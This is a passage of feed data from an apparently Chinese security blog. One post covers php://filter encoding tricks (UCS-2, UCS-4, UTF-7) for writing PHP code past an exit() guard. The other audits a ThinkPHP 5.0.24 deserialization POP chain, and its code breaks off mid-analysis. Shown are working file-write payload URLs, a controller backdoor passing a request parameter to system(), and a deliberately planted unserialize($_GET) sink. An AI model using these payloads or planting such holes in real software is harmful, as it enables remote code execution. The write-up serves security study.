src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221108113137683.png" alt="image-20221108113137683"></p><p>(这里字符串长20，同时是4和2的倍数，我就没改)</p><p>这里尝试传入payload，使用UCS-2编码方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/text.php?a=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?%3Chp%20phpipfn(o;)%3E?/resource=123/../123.php</span><br></pre></td></tr></table></figure><p>写入效果：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221108164418028.png" alt="image-20221108164418028"></p><p>运行效果：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221108164529069.png" alt="image-20221108164529069"></p><p>而使用UCS-4的写入效果同理：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-4LE&quot;</span>,<span class="string">&quot;UCS-4BE&quot;</span>,<span class="string">&quot;&lt;?php phpinfo();?&gt;aa&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里注意，要将字符串补充到4的倍数，因此添加了两个a。</p><p>然后使用伪协议进行处理：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/text.php?a=php://filter/convert.iconv.UCS-4LE.UCS-4BE|?%3Caa%20phpiphp(ofn%3E?;)/resource=123.php</span><br></pre></td></tr></table></figure><p>即可实现写入。</p><h3 id="UTF-8字符编码绕过："><a href="#UTF-8字符编码绕过：" class="headerlink" title="UTF-8字符编码绕过："></a>UTF-8字符编码绕过：</h3><p>这个绕过方法属于base64去除等号绕过方法的另改版，可以通过进行不同编码的方法来去除等号，这样的话，就可以避免因为<code>resource=</code>的原因导致base64解码失败。</p><p>这里简单来说，就是将等号的编码从utf-8转换为utf-7，会将等号转换为<code>+AD0-</code>，但是这样并不会影响对于base64的解码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UTF-8&quot;</span>,<span class="string">&quot;UTF-7&quot;</span>,<span class="string">&quot;=&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221109084450087.png" alt="image-20221109084450087"></p><p>也就是说，可以通过将字符串转换为utf-7，然后通过base64解码就可以了。</p><p>这里给出一个Payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/text.php?a=php://filter/convert.iconv.UTF-8.UTF-7|convert.base64-decode|aaPD9waHAgcGhwaW5mbygpOyAgICAgPz4=/resource=123.php</span></span><br></pre></td></tr></table></figure><p>注意这里对base64加密的字符串前面加上了两个<code>a</code>，这是为了凑够4的倍数，因为将utf-8转换为utf-7的时候，会使得字符串产生变化，这个得根据自己的Payload来实际算一下，比如我的，写入文件后应该是这样的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php exit();?&gt;php://filter/convert.iconv.UTF-8.UTF-7|convert.base64-decode|aaPD9waHAgcGhwaW5mbygpOyAgICAgPz4=/resource=123.php</span><br></pre></td></tr></table></figure><p>然后进行utf-8转换为utf-7，可以看见字符串变成了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ADw?php exit()+ADs?+AD4-php://filter/convert.iconv.UTF-8.UTF-7+AHw-convert.base64-decode+AHw-aaPD9waHAgcGhwaW5mbygpOyAgICAgPz4+AD0-/resource+AD0-123.php</span><br></pre></td></tr></table></figure><p>这里根据之前写过的base64编码后的原则数一下，可以发现这里在Payload前面一共存在78个字符，所以添上两个字符。</p><p>写入效果：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221109093302209.png" alt="image-20221109093302209"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221109093431574.png" alt="image-20221109093431574"></p>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP-5.0.x POP链</title>
      <link href="/2022/08/24/ThinkPHP-5-0-x%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/08/24/ThinkPHP-5-0-x%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-5-0-X代码审计："><a href="#ThinkPHP-5-0-X代码审计：" class="headerlink" title="ThinkPHP 5.0.X代码审计："></a>ThinkPHP 5.0.X代码审计：</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>本次记录主要是对ThinkPHP 框架的 5.0.x版本进行代码审计，主要涉及的软件有：</p><blockquote><p>PHPSTORM</p><p>Seay源代码审计系统</p><p>Phpstudy_pro</p><p>PHP版本使用7.3.4</p></blockquote><p>关于PHPSTORM的Xdebug的搭建，我主要参考了<a href="https://www.bilibili.com/video/BV1Ri4y1m7AZ/?spm_id_from=333.788&vd_source=12a4f922a214b16d9f4d1f3565210b8b">暗月的教程</a></p><p>（说实话phpstudy_pro的配置文件真的太麻烦了）</p><p><a href="http://www.thinkphp.cn/donate/download/id/1279.html">ThinkPHP 5.0.24 链接</a></p><h2 id="Seay自动审计："><a href="#Seay自动审计：" class="headerlink" title="Seay自动审计："></a>Seay自动审计：</h2><p>首先还是常规操作，使用Seay源代码审计系统来进行自动审计：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220809164053433.png" alt="image-20220809164053433"></p><p>这边出了一堆。不过不是每个都有用的。</p><p>主要还是要审计POP链，然后RCE。</p><h2 id="目录结构："><a href="#目录结构：" class="headerlink" title="目录结构："></a>目录结构：</h2><p>首先是对ThinkPHP 5.0目录结构进行查看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www  WEB部署目录（或者子目录）</span><br><span class="line">├─application           应用目录</span><br><span class="line">│  ├─common             公共模块目录（可以更改）</span><br><span class="line">│  ├─module_name        模块目录</span><br><span class="line">│  │  ├─config.php      模块配置文件</span><br><span class="line">│  │  ├─common.php      模块函数文件</span><br><span class="line">│  │  ├─controller      控制器目录</span><br><span class="line">│  │  ├─model           模型目录</span><br><span class="line">│  │  ├─view            视图目录</span><br><span class="line">│  │  └─ ...            更多类库目录</span><br><span class="line">│  │</span><br><span class="line">│  ├─command.php        命令行工具配置文件</span><br><span class="line">│  ├─common.php         公共函数文件</span><br><span class="line">│  ├─config.php         公共配置文件</span><br><span class="line">│  ├─route.php          路由配置文件</span><br><span class="line">│  ├─tags.php           应用行为扩展定义文件</span><br><span class="line">│  └─database.php       数据库配置文件</span><br><span class="line">│</span><br><span class="line">├─public                WEB目录（对外访问目录）</span><br><span class="line">│  ├─index.php          入口文件</span><br><span class="line">│  ├─router.php         快速测试文件</span><br><span class="line">│  └─.htaccess          用于apache的重写</span><br><span class="line">│</span><br><span class="line">├─thinkphp              框架系统目录</span><br><span class="line">│  ├─lang               语言文件目录</span><br><span class="line">│  ├─library            框架类库目录</span><br><span class="line">│  │  ├─think           Think类库包目录</span><br><span class="line">│  │  └─traits          系统Trait目录</span><br><span class="line">│  │</span><br><span class="line">│  ├─tpl                系统模板目录</span><br><span class="line">│  ├─base.php           基础定义文件</span><br><span class="line">│  ├─console.php        控制台入口文件</span><br><span class="line">│  ├─convention.php     框架惯例配置文件</span><br><span class="line">│  ├─helper.php         助手函数文件</span><br><span class="line">│  ├─phpunit.xml        phpunit配置文件</span><br><span class="line">│  └─start.php          框架入口文件</span><br><span class="line">│</span><br><span class="line">├─extend                扩展类库目录</span><br><span class="line">├─runtime               应用的运行时目录（可写，可定制）</span><br><span class="line">├─vendor                第三方类库目录（Composer依赖库）</span><br><span class="line">├─build.php             自动生成定义文件（参考）</span><br><span class="line">├─composer.json         composer 定义文件</span><br><span class="line">├─LICENSE.txt           授权说明文件</span><br><span class="line">├─README.md             README 文件</span><br><span class="line">├─think                 命令行入口文件</span><br></pre></td></tr></table></figure><p>这部分可以比较明确的看见每个部分代码的作用是什么，方便到时候思考，或者是跟链子。</p><h2 id="构建利用点："><a href="#构建利用点：" class="headerlink" title="构建利用点："></a>构建利用点：</h2><p><strong>关于控制器文件(Controller):</strong></p><p>ThinkPHP的控制器是一个类，接收用户的输入并调用模型和视图去完成用户的需求，控制器层由核心控制器和业务控制器组成，核心控制器由系统内部的App类完成，负责应用（包括模块、控制器和操作）的调度控制，包括HTTP请求拦截和转发、加载配置等。业务控制器则由用户定义的控制器类完成。多层业务控制器的实现原理和模型的分层类似，例如业务控制器和事件控制器。</p><p><strong>控制器写法：</strong></p><p>控制器文件通常放在<code>application/module/controller</code>下面，类名和文件名保持大小写一致，并采用驼峰命名（首字母大写）。</p><p>一个典型的控制器类定义如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>控制器类文件的实际位置是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">application\index\controller\Index.php</span><br></pre></td></tr></table></figure><p>一个例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; .think_default_text&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt; ThinkPHP V5&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;十年磨一剑 - 为API开发设计的高性能框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;[ V5.0 版本由 &lt;a href=&quot;http://www.qiniu.com&quot; target=&quot;qiniu&quot;&gt;七牛云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ad_bd568ce7058a1091&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"><span class="variable">$command</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想进入后门，需要访问：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/index.php/Index/backdoor/?command=ls</span><br></pre></td></tr></table></figure><p>像上面这样就可以实现命令执行。</p><p>这个框架是需要<strong>二次开发</strong>，并且实现反序列化才能够进行利用，<strong>所以需要手写一个利用点。</strong>就写在controller里。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome thinkphp 5.0.24&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])); <span class="comment">//下面部分是自带的。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; .think_default_text&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt; ThinkPHP V5&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;十年磨一剑 - 为API开发设计的高性能框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;[ V5.0 版本由 &lt;a href=&quot;http://www.qiniu.com&quot; target=&quot;qiniu&quot;&gt;七牛云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ad_bd568ce7058a1091&quot;&gt;&lt;/think&gt;&#x27;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="利用链分析："><a href="#利用链分析：" class="headerlink" title="利用链分析："></a>利用链分析：</h2><p>对于PHP反序列化来说，一般来说，比较常见的起点是：</p><blockquote><p>_wakeup()  反序列化后，自动被调用</p><p>_destruct() 对象被销毁前，被调用</p><p>_toString()  对象被当作字符串输出前，被调用</p></blockquote><p>比较常见的中间跳板是：</p><blockquote><p>__toString 当一个对象被当做字符串使用，自动被调用</p><p>__get 读取不可访问或不存在属性时被调用</p><p>__set 当给不可访问或不存在属性赋值时被调用</p><p>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</p><p>形如 $this-&gt;$func();</p></blockquote><p>根据以上两个经验，首先在Seay中进行全局查找。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810164113231.png" alt="image-20220810164113231"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810164130266.png" alt="image-20220810164130266"></p><p>那么可能存在的POP链大概率就在这部分。</p><h2 id="尝试审计："><a href="#尝试审计：" class="headerlink" title="尝试审计："></a>尝试审计：</h2><p>尝试审计第一个<code>__wakeup()</code></p><p>实际上来说<code>__wakeup()</code>因为是在进行了反序列化之后才进行的，所以大部分时候是对反序列化内容的限制，很少作为入口，大部分时候可以直接看<code>__destruct()</code></p><p>但是这里还是看一下</p><p>从Seay里可以看见，这部分的反序列化函数在：<br><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810165159038.png" alt="image-20220810165159038"></p><p>首先看一下<code>unserialize()</code>中的值是否可控。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810171741240.png" alt="image-20220810171741240"></p><p>向上看一下<code>$value</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810173114362.png" alt="image-20220810173114362"></p><p>这里可以看见value的值被设置为了null。</p><p>后面陆续向下看，可以发现的是$value值在这部分被用来存储时间戳<img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810200145426.png" alt="image-20220810200145426"></p><p>然后在接下来的<code>writeTransform()</code>函数部分进行使用者需要的数据类型的更改。</p><p>然后在<code>readTransform()</code>部分进行数据类型的变回去（进行了json格式加码，就进行解码，进行了序列化的就反序列化）</p><p>因此很容易发现<code>$value</code>的值是我们不能操控的，所以这里无法利用。</p><h2 id="POP链："><a href="#POP链：" class="headerlink" title="POP链："></a>POP链：</h2><p>有了以上的经验，接下来我们对<code>__destruct()</code>函数进行审计。</p><p>路径：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp/library/think/process/pipes/Windows.php</span><br></pre></td></tr></table></figure><p>这里首先看一下<code>__destruct()</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810201437296.png" alt="image-20220810201437296"></p><p>可以看见这边调用了两个函数，跟进一下。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810201548871.png" alt="image-20220810201548871"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810201608641.png" alt="image-20220810201608641"> </p><p>首先分析一下<code>close()</code>成员方法。</p><p>可以看到这里首先是调用了父类中的<code>close()</code>方法，这里跟进一下，可以找到父类<code>Pipes</code>中的<code>close()</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810202655543.png" alt="image-20220810202655543"></p><p>这里的作用就是将<code>pipes</code>数组中存在的文件一一关闭，最后再将<code>pipes</code>数组清空。</p><p>子类中的方法同理，可知<code>close()</code>用于关闭文件，虽然可以控制传参，但是不能进一步利用。</p><p>分析<code>removeFiles()</code>成员方法。</p><p>可以看见这里有一个敏感函数，<code>file_exists()</code>。当执行该函数的时候，会将参数作为字符串来判断，如果输入的是参数是一个对象，可以触发<code>__toString()</code>魔术方法</p><p>看一下<code>$filename</code>能不能控制。</p><p>这里看一下<code>$this-&gt;files</code>的用法，写入值在<code>__construct()</code>，不影响，因为反序列化不会调用<code>__construct()</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810223824350.png" alt="image-20220810223824350"></p><p>可以在<code>__construct()</code>看见files数组中，进行定义的过程。</p><p>这里使用到了<code>tempnam()</code>函数，可以再指定的目录中创建一个具有唯一文件名的临时文件。成功返回新的文件名，失败返回false。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220811155604058.png" alt="image-20220811155604058"></p><p>另一个函数返回当前操作系统的临时文件目录。</p><p>这部分可以看见数组<code>$file</code>的定义，发现是可以控制的。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220811203810750.png" alt="image-20220811203810750"></p><p>跟进到<code>__toString()</code>，在Seay代码审计系统中进行全局搜索：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220811204906271.png" alt="image-20220811204906271"></p><p>这里经过尝试之后，可以直接跟进到<code>Model.php</code>中的<code>__toString()</code>参数。**(注意Model是一个抽象类，要进行了继承了之后才能实例化成对象，所以要找一个子类，这里可以选择Pivot)**</p><p><img src="C:\Users\Ho1L0w_By\AppData\Roaming\Typora\typora-user-images\image-20220812142053975.png" alt="image-20220812142053975"></p><p>跟进到<code>toJson()</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812142139952.png" alt="image-20220812142139952"></p><p>这里使用了<code>json_encode()</code>函数，函数返回一个字符串，包含了value值json格式的表示。编码会受到options参数的印象。</p><p>跟进到<code>toArray()</code>方法。（太长了，不放截图）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 转换当前模型对象为数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>    = [];</span><br><span class="line">        <span class="variable">$visible</span> = [];</span><br><span class="line">        <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 过滤属性</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;visible)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseAttr</span>(<span class="variable">$this</span>-&gt;visible, <span class="variable">$visible</span>);</span><br><span class="line">            <span class="variable">$data</span>  = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="variable">$array</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseAttr</span>(<span class="variable">$this</span>-&gt;hidden, <span class="variable">$hidden</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$data</span>  = <span class="title function_ invoke__">array_diff_key</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="variable">$array</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">subToArray</span>(<span class="variable">$val</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; <span class="title function_ invoke__">reset</span>(<span class="variable">$val</span>) <span class="keyword">instanceof</span> Model) &#123;</span><br><span class="line">                <span class="comment">// 关联模型数据集</span></span><br><span class="line">                <span class="variable">$arr</span> = [];</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="variable">$arr</span>[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">subToArray</span>(<span class="variable">$value</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$arr</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 模型属性</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                        <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                        <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                            <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                                <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                    <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span 